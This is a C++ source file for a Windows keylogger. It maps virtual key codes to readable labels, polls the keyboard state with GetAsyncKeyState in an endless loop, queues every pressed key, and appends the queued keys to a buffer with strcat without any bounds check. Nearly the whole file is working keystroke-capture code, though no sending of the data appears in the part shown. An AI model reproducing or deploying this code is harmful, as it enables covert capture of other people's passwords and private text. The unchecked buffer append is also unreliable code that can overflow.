#include <iostream>
#include <Windows.h>
#include "keylogger.h"

const char* virtualKeyCodes[] = {"","<Left-Mouse>;","<Right-Mouse>;","<Cancel>;","<Middle-Mouse>;","<X1-Mouse>;",
	"<X2-Mouse>;","","<BackSpace>;","	","","","<Clear>;","<Enter>;","","","<Shift>;","<CTRL>;","<ALT>;",
	"<Pause>;","<Caps-Lock>;","<IME-Hangul-Mode>;","","<IME-Junja>;","<IME-Final>;","<IME-Hanja>;",
	"","<ESC>;","<IME-Conver>;","<IME-NonConver>;","<IME-Accept>;","<IME-Mode-Change-Request>;"," ","<Page-Up>;",
	"<Page-Down>;","<End>;","<Home-Key>;","<Left-Arrow>;","<Up-Arrow>;","<Right-Arrow>;","<Down-Arrow>;",
	"<Select>;","<Print-Key>;","<Execute-Key>;","<Print-Screen>;","<INS>;","<Delete>;","<Help>;","0",
	"1","2","3","4","5","6","7","8","9","","","","","","","","a","b","c","d","e","f","g","h","i","j","k",
	"l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","<Left-Windows-Key>;","<Right-Windows-Key>;","<Application-Key>;",
	"","<Computer-Sleep>;","0","1","2","3","4","5","6","7","8","9","*","+","|","-",".","/","<F1>;","<F2>;","<F3>;","<F4>;",
	"<F5>;","<F6>;","<F7>;","<F8>;","<F9>;","<F10>;","<F11>;","<F12>;","<F13>;","<F14>;","<F15>;","<F16>;","<F17>;","<F18>;",
	"<F19>;","<F20>;","<F21>;","<F22>;","<F23>;","<F24>;","","","","","","","","","<Num-Lock>;",
	"<Scroll-Lock>;","","","","","","","","","","","","","","","","","","<Control>;","<Control>;","<Menue>;","<Menue>;",
	"<Browser Back>;","<Browser Forward>;","<Browser Refresh>;","<Browser Stop>;","<Browser Search>;","<Browser Favorite>;",
	"<Browser Home>;","<Volume Mute>;","<Volume Down>;","<Volume Up>;", "<New Track>;","<Previous Track>;",
	"<Play/Pause>;","<Start Mail>;","<Select Media>;","<Start Application 1>;","<Start Application 2>;",
	"","",";","=",",","-",".","/","`","","","","","","","","","","","","","","","","","","","","","","","","","","","[",
	"\\","]","'","","","","< [ OR / >;","","","<IME-Process>;","","","","","","","","","","","","","","","",
	"<Attn>;", "<CrSel>;","<ExSel>;","<Erase>;","<Play>;","<Zoom>;","","<PA1>;","<Clear>;"};

void getKeys(std::queue<const char*>* qp, char* keys_buf)
{
	// dequeue all until length = 0
	while(qp->size() != 0) 
	{
		strcat(keys_buf, qp->front());
		qp->pop();
	}
}

void logKeys(std::queue<const char*>* qp)
{
	while(1)
	{
		Sleep(10);
		for (int i=0;i<255;i++)
		{
			if (GetAsyncKeyState(i) & 1)
			{		
				qp->push(virtualKeyCodes[i]);
			}
		}
	}
}


